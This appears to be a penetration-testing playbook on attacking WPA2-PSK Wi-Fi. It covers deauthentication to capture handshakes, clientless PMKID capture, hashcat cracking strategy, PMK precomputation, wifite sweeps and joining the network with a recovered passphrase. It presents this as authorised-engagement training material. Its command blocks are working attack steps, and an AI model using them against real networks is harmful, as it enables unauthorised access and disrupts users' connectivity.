# Wireless - WPA2-PSK: handshake capture, PMKID and cracking

## The four paths against WPA2-PSK, in order

**Trigger:** The survey shows `WPA2 ... PSK` on an in-scope BSSID.

There are four viable approaches and the order matters, because they differ enormously in cost and in the chance of success. Check **WPS** first: if it is advertised and unlocked, PIN recovery hands you the plaintext passphrase regardless of how strong that passphrase is, and a strong passphrase is precisely what defeats the other three paths. Second, if any client is associated and PMF is off, **capture the 4-way handshake** by forcing a reassociation — this is the classic path and the fastest to set up. Third, if there are no clients at all, try **PMKID**, which needs nothing but the AP itself. Fourth, if the passphrase survives offline cracking, switch from attacking the crypto to attacking the user with an **evil twin** and a captive portal. Note that paths two, three and four all end at the same place — a hash in mode 22000 and a cracking decision — so against a corporate WLAN the hard part is rarely capturing the material but whether the passphrase falls to your wordlist, which is why the WPS check comes first: it is the only path where passphrase strength is irrelevant.

```text
  WPS advertised + unlocked?   -> wps-attacks.md            (best: ignores passphrase strength)
  Clients associated + PMF off -> deauth, catch the 4-way   (below)
  No clients at all            -> PMKID                     (below)
  Passphrase survives cracking -> evil twin / captive portal -> rogue-ap-and-karma.md
  Deauth needed but PMF is on  -> PMKID only; client-side-and-dos.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising WPA2 Wi-Fi Network

## Deauthentication into a 4-way handshake

**Trigger:** WPA2-PSK, at least one associated station, and the beacon shows PMF not required.

The four-way handshake happens only at association, so you either wait for someone to connect or you make them reconnect. Start the capture *before* the deauthentication and leave it running — the single most common failure is deauthenticating first and starting the capture afterwards, catching nothing, and concluding the attack does not work. Lock the capture to the target channel and BSSID so the card cannot hop away mid-exchange. Then send a small number of deauthentication frames: three to five is plenty, and the instinct to send hundreds is actively counterproductive because a client hammered continuously never gets a quiet window in which to complete the association it is trying to make, so you capture a flood of deauth frames and no EAPOL. Prefer targeting a specific client with `-c` over broadcasting, both because it is much more reliable and because it is far less disruptive on a production network where the broadcast form knocks every device off at once. Confirm success from the `WPA handshake:` banner in the airodump header rather than assuming, and validate the capture with `cowpatty -c` before you tear the rig down, since discovering the handshake was partial after you have left the site means going back.

```bash
# 1. Capture first, locked to channel and BSSID
sudo airodump-ng wlan0mon -c 1 --bssid FE:E1:DE:CE:A5:E1 -w handshake

# 2. Then a few deauth frames, from a second terminal
sudo aireplay-ng --deauth 3 -a FE:E1:DE:CE:A5:E1 -c 02:00:00:00:03:00 wlan0mon
sudo aireplay-ng --deauth 3 -a FE:E1:DE:CE:A5:E1 wlan0mon      # broadcast: louder, less reliable

# 3. Watch for the header banner:
#    CH 1 ][ Elapsed: 18 s ][ WPA handshake: FE:E1:DE:CE:A5:E1

# 4. Validate before leaving
cowpatty -c -r handshake-01.cap
aircrack-ng handshake-01.cap          # "1 handshake" in the listing
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA2 Wi-Fi Network; offsecexams.com OSWP cheatsheet

## Clientless PMKID capture

**Trigger:** WPA2-PSK with no associated clients, or PMF is enabled so deauthentication is unavailable.

Many access points volunteer a PMKID in the first EAPOL frame of an association attempt, and because that value is a hash over the pairwise master key plus both MAC addresses, it is crackable exactly like a handshake — but you obtain it by associating yourself, with no client present and no deauthentication required. That makes it the right first move whenever the station list is empty, and the only passphrase-recovery move available against a PMF-protected WPA2 network. The operational gotchas are what make this fail for people. Do not pre-enable monitor mode: modern `hcxdumptool` manages the interface itself and fighting it produces an empty capture. Stop NetworkManager and `wpa_supplicant` first for the same reason. Scope the attack to your authorised BSSID with a filter list rather than running the broad sweep, which in a corporate building will touch networks outside your scope. Afterwards, do not merge, clean or run any pcap-tidying utility over the output — those tools strip the fields the converter needs, and the classic symptom is a hash file the cracker refuses to load. Note also that not every AP offers a PMKID; an empty result after several minutes means this AP does not, not that you did it wrong.

```bash
sudo systemctl stop NetworkManager.service wpa_supplicant.service

# Scope to one authorised AP
echo "AABBCCDDEEFF" > target-bssid

# hcxdumptool 6.2.x syntax
sudo hcxdumptool -i wlan0 -o dump.pcapng --enable_status=15 \
  --filterlist_ap=target-bssid --filtermode=2

# hcxdumptool 6.3 / 7.x syntax — options were renamed; check `hcxdumptool --version`
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 -F
sudo hcxdumptool -i wlan0 -w dump.pcapng --bpfc="wlan addr3 aa:bb:cc:dd:ee:ff"

hcxpcapngtool -o hash.hc22000 dump.pcapng
sudo systemctl start wpa_supplicant.service NetworkManager.service

# Do NOT pre-enable monitor mode. Do NOT wpaclean/mergecap the pcapng.
```

Source: offsecexams.com OSWP cheatsheet; HTB Academy, Attacking Corporate Wi-Fi Networks

## Converting a capture to hashcat mode 22000

**Trigger:** You hold a `.cap` or `.pcapng` and need something a cracker will accept.

Mode 22000 is the current unified format covering both EAPOL handshakes and PMKIDs, and `hcxpcapngtool` is the converter that produces it. Everything older is a trap: `.hccapx` targets the deprecated mode 2500, `cap2hccapx` is dead, and `hcxpcaptool` was renamed. Read the converter's summary output rather than skipping past it, because it tells you what you actually caught — the `EAPOL pairs written` count is the number of usable hashes, the M1/M2/M3/M4 counts tell you whether the handshake is complete, and an `M12E2 (challenge)` line means you have a half-handshake from a rogue AP rather than a full exchange against the real one, which is still crackable. The tool also warns when a capture has been cleaned or filtered, which is your signal that a pcap utility stripped fields. Inspect the resulting hash line before starting an expensive crack: it encodes the AP MAC, the client MAC and the ESSID in hex, so you can confirm you are about to spend GPU hours on the right network rather than on a neighbour that wandered into the capture.

```bash
hcxpcapngtool -o hash.hc22000 capture-01.cap
hcxpcapngtool -o hash.hc22000 -E wordlist-from-capture.txt capture-01.cap  # bonus: strings seen on air

cat hash.hc22000
# WPA*02*<mic>*<apmac>*<clientmac>*<essid-hex>*<nonce>*<eapol>*<flag>
#     02 = EAPOL   01 = PMKID

# Decode the ESSID field to confirm the target
echo "537461724c696768742d42594f44" | xxd -r -p; echo

# Split a multi-network hash file before cracking
hcxhashtool -i hash.hc22000 --essid="CorpWiFi" -o corp.hc22000
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA2 / WPA3 Wi-Fi Network

## Cracking strategy against a corporate passphrase

**Trigger:** You have a valid mode-22000 hash and need to decide how to spend cracking time.

WPA2 key derivation is 4096 iterations of PBKDF2 salted with the ESSID, which makes it slow enough that strategy matters more than hardware — a CPU manages hundreds to low thousands of candidates per second, a decent GPU low hundreds of thousands, and neither is going to exhaust an eight-character random space. Corporate passphrases are rarely random, though, and that is the lever. Start with a plain wordlist run to catch the genuinely weak case, then apply a rule set to a curated list rather than reaching for a bigger list, because rules multiply a good list far more efficiently than raw volume. Build a target-specific list before anything else: the company name, the site name, the SSID itself, the address, the year, the local sports team, product names — a corporate PSK is very often a compound of two of those plus a number. Remember the minimum length is eight characters, so anything shorter is rejected by the kernel and any mask that produces shorter candidates is wasted work. Mask attacks pay off once you have seen the pattern; if one site's key cracks as `CompanyName2024!`, the same shape usually recurs across the estate and a mask expressing it is far faster than a wordlist. `Exhausted` means the wordlist and rules were insufficient, not that the passphrase is strong — the two are easy to confuse and only the first is something you can act on.

```bash
# 1. Straight wordlist
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# 2. Rules against a curated list (far better than a bigger raw list)
hashcat -m 22000 -r /opt/OneRuleToRuleThemAll.rule hash.hc22000 wordlist.txt
hashcat -m 22000 -r /usr/share/hashcat/rules/best64.rule hash.hc22000 wordlist.txt

# 3. Target-specific candidates — build this first for a corporate engagement
printf '%s\n' CorpName SiteName CorpWiFi Reception Guest2024 > corp-base.txt
hashcat -m 22000 -a 6 hash.hc22000 corp-base.txt '?d?d?d?d'      # append year
hashcat -m 22000 -a 7 hash.hc22000 '?u?l?l?l' corp-base.txt      # prepend

# 4. Mask, once you know the client's pattern (min length 8)
hashcat -m 22000 -a 3 hash.hc22000 '?u?l?l?l?l?l?d?d?d?d'

# 5. Stream mangled candidates without writing them to disk
john --wordlist=wordlist.txt --rules --stdout | hashcat -m 22000 hash.hc22000

# Progress and results
hashcat -m 22000 hash.hc22000 --show
hashcat -m 22000 hash.hc22000 wordlist.txt --status --status-timer=30
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA2 Wi-Fi Network; offsecexams.com OSWP cheatsheet

## ESSID-salted PMK precomputation and the CPU-only fallback

**Trigger:** You are CPU-only, or you expect to attack the same ESSID repeatedly across a multi-site estate.

The pairwise master key is derived from the passphrase salted with the ESSID and nothing else, which has two consequences worth exploiting. Because the salt is just the network name, all of that expensive derivation can be done once per ESSID and reused — build a database keyed on the target's name, batch-compute the PMKs, and every subsequent crack against that ESSID becomes a table lookup instead of a key derivation. That is exactly the shape of a multi-site corporate engagement where the same SSID is deployed at twenty clinics: precompute once, test everywhere. The same property explains why generic rainbow tables are useless unless built for precisely this ESSID, which is why only a handful of extremely common default names have public tables. Always pass the ESSID explicitly when cracking a capture containing several networks, or you waste work on the wrong salt. The precomputation only pays off if you will reuse the table; for a single one-shot crack, go straight to GPU mode 22000 instead, and if you have no GPU at all, accept that you are limited to catching low-hanging fruit and say so in the report rather than presenting an exhausted CPU run as proof of a strong passphrase.

```bash
echo "CorpWiFi" > essid.txt
airolib-ng db --import essid essid.txt
airolib-ng db --import passwd wordlist.txt
airolib-ng db --batch                     # precompute PMKs for this ESSID
airolib-ng db --stats
aircrack-ng -r db capture-01.cap

# cowpatty equivalent
genpmk -s "CorpWiFi" -f wordlist.txt -d pmk-table
cowpatty -r capture-01.cap -d pmk-table -s "CorpWiFi"
cowpatty -r capture-01.cap -f wordlist.txt -s "CorpWiFi"

# pyrit — GPU-accelerated equivalent (dated, but part of the classic OSWP toolset)
pyrit -r capture-01.cap -i wordlist.txt -b AA:BB:CC:DD:EE:FF attack_passthrough
pyrit -e "CorpWiFi" -i wordlist.txt import_passwords && pyrit batch    # precompute path

# aircrack directly, ESSID pinned so a multi-network capture is not wasted
aircrack-ng -e "CorpWiFi" -w wordlist.txt capture-01.cap
```

Source: offsecexams.com OSWP cheatsheet

## Automated sweep with wifite for breadth

**Trigger:** Many in-scope BSSIDs and limited time, or you want a second opinion on whether anything obvious was missed.

`wifite2` orchestrates the whole WPA2 flow — survey, WPS check, PMKID attempt, handshake capture with deauthentication, conversion and cracking — across many targets in sequence, which is a genuine time saver on a fleet of twenty APs where doing it by hand is mechanical. Treat it as a breadth tool, not a replacement for the manual path: it decides for you when to deauthenticate and how hard, which is exactly the decision that needs human judgement on a production network, so constrain it explicitly to your authorised BSSIDs and to the attacks you have authorisation for. Its real value in an engagement is as a completeness check at the end — running it against the fleet and finding it caught a PMKID you missed on one AP is cheap, and finding it caught nothing new is evidence your manual coverage was complete. Never point it at a broad scan on a client site; the default behaviour will happily attack whatever it sees.

```bash
# Constrain to authorised targets and to attacks you have sign-off for
sudo wifite --bssid FE:E1:DE:CE:A5:E1 --channel 1 --wpa --no-wps --dict wordlist.txt
sudo wifite --essid "CorpWiFi" --wpa --pmkid --no-deauths      # passive-only variant

# Captured handshakes land in ~/hs/ and are already converted
ls ~/hs/
```

Source: Operator practice

## Verifying and using a recovered passphrase

**Trigger:** A crack succeeded and you need to prove access and move inward.

Connect with `wpa_supplicant` from the command line rather than a desktop GUI, because the GUI hides which key management was negotiated and gives you nothing to script. `wpa_passphrase` generates the config with the PSK already derived; add `key_mgmt=SAE` by hand if the network is WPA3. The moment the association completes, read the address, the gateway and the routing table, because the WLAN you have joined determines everything that follows — a guest SSID that hands out a NAT address behind an isolated gateway and a corporate SSID that routes into internal subnets look identical from the association's point of view and completely different from the route table's.

```bash
wpa_passphrase "CorpWiFi" 'RecoveredPassphrase' > wpa.conf
sudo wpa_supplicant -B -i wlan0 -c wpa.conf
sudo dhclient wlan0

ip addr show wlan0
ip route
route -n

# Then map what this network reaches -> post-access-pivot.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation
